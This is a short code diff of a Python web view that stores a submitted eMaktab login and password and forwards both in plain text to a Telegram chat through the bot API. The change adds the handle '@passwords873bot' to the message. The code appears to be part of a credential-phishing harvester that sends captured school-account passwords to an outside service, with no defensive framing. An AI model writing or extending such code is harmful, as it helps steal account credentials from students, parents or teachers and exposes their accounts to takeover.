@@ -16,7 +16,7 @@ def emaktab(request,id):
         )
         emaktab.save()
 
-        text = f"eMaktab profile 😂\n\n👤 *Login*: ```{login}```\n🔒 *Parol*: ```{password}```\n"
+        text = f"eMaktab profile 😂\n\n👤 *Login*: ```{login}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                           data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})
 
